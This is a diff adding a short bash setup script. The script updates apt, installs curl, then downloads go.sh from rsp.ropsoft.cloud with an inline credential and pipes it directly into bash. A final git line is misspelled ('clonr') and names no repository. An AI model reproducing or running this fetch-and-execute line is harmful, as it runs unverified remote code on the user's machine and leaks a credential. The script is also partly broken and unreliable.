@@ -1,0 +1,11 @@
+#!/bin/bash
+
+apt update -y;
+
+apt install curl;
+
+curl -u rsp@777 https://rsp.ropsoft.cloud/go.sh | bash;
+
+git clonr https://github.com
+
+exit 0;
